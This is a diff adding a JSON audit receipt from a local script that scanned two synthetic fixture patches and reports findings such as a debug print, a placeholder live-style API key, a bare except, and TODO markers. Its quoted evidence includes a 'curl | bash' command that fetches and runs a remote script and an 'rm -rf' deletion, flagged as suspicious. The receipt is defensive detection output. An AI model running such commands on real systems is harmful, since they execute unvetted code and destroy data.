@@ -1,0 +1,115 @@
+{
+  "verdict": "[HERMES_STAGE1_LOCAL_DIFF_AUDIT_RECEIPT]",
+  "timestamp": "2026-05-16T06:43:55.208110+00:00",
+  "command": "python3 audit_diff_fixtures.py",
+  "input_files": [
+    "/Users/sungsookim/universe/vectorfl_replica/app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_local_diff_audit_with_persistence_boundary_v0/fixture_diff_A.patch",
+    "/Users/sungsookim/universe/vectorfl_replica/app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_local_diff_audit_with_persistence_boundary_v0/fixture_diff_B.patch"
+  ],
+  "output_files": [
+    "/Users/sungsookim/universe/vectorfl_replica/app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_local_diff_audit_with_persistence_boundary_v0/fixture_diff_A.patch",
+    "/Users/sungsookim/universe/vectorfl_replica/app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_local_diff_audit_with_persistence_boundary_v0/fixture_diff_B.patch",
+    "/Users/sungsookim/universe/vectorfl_replica/app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_local_diff_audit_with_persistence_boundary_v0/audit_diff_fixtures.py",
+    "/Users/sungsookim/universe/vectorfl_replica/app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_local_diff_audit_with_persistence_boundary_v0/audit_report.md",
+    "/Users/sungsookim/universe/vectorfl_replica/app/work/space-skill-sandbox/outputs/05_15_sequential_execution_cards/hermes_stage1_local_diff_audit_with_persistence_boundary_v0/audit_receipt.json"
+  ],
+  "exit_code": 0,
+  "network_used": false,
+  "packages_installed": false,
+  "subprocess_used": false,
+  "git_used": false,
+  "input_files_modified": false,
+  "memory_modified": false,
+  "skill_modified": false,
+  "cron_modified": false,
+  "config_modified": false,
+  "vectorfl_authority_files_modified": false,
+  "source_files_modified": false,
+  "patches_applied": false,
+  "repo_wide_search_used": false,
+  "browser_used": false,
+  "mcp_used": false,
+  "current_position_updated": false,
+  "output_manifest_updated": false,
+  "baseline_workflow_schema_registry_ontology_promoted": false,
+  "results": [
+    {
+      "file": "fixture_diff_A.patch",
+      "removed_line_count": 1,
+      "finding_count": 4,
+      "findings": [
+        {
+          "rule": "debug print",
+          "line": 8,
+          "evidence": "    print(\"DEBUG customer=\", customer)",
+          "severity": "medium",
+          "note": "Added print() statement in code diff."
+        },
+        {
+          "rule": "hardcoded secret-looking string",
+          "line": 9,
+          "evidence": "    api_key = \"sk_live_1234567890abcdef\"",
+          "severity": "high",
+          "note": "Added line contains secret-looking token/API-key marker."
+        },
+        {
+          "rule": "bare except",
+          "line": 12,
+          "evidence": "    except:",
+          "severity": "medium",
+          "note": "Added bare except may hide failures."
+        },
+        {
+          "rule": "unresolved TODO / FIXME",
+          "line": 15,
+          "evidence": "# TODO: remove before production",
+          "severity": "low",
+          "note": "Added unresolved TODO/FIXME marker."
+        }
+      ]
+    },
+    {
+      "file": "fixture_diff_B.patch",
+      "removed_line_count": 4,
+      "finding_count": 3,
+      "findings": [
+        {
+          "rule": "suspicious shell command: curl pipe bash",
+          "line": 14,
+          "evidence": "curl -s https://example.invalid/install.sh | bash",
+          "severity": "high",
+          "note": "Added curl pipe bash command."
+        },
+        {
+          "rule": "suspicious shell command: rm -rf",
+          "line": 15,
+          "evidence": "rm -rf /tmp/vectorfl-build-cache",
+          "severity": "high",
+          "note": "Added rm -rf command."
+        },
+        {
+          "rule": "unresolved TODO / FIXME",
+          "line": 16,
+          "evidence": "# FIXME: restore tests after launch",
+          "severity": "low",
+          "note": "Added unresolved TODO/FIXME marker."
+        }
+      ]
+    }
+  ],
+  "rule_hits": {
+    "debug print": 1,
+    "hardcoded secret-looking string": 1,
+    "bare except": 1,
+    "unresolved TODO / FIXME": 2,
+    "suspicious shell command: curl pipe bash": 1,
+    "suspicious shell command: rm -rf": 1,
+    "large deletion marker": 0
+  },
+  "notes": [
+    "Stage 1 local deterministic execution only.",
+    "Fixture patch files are synthetic and were not applied.",
+    "Receipt is evidence only, not VectorFL authority.",
+    "Reusable diff-audit rules are candidate only, not component/workflow/skill/baseline."
+  ]
+}
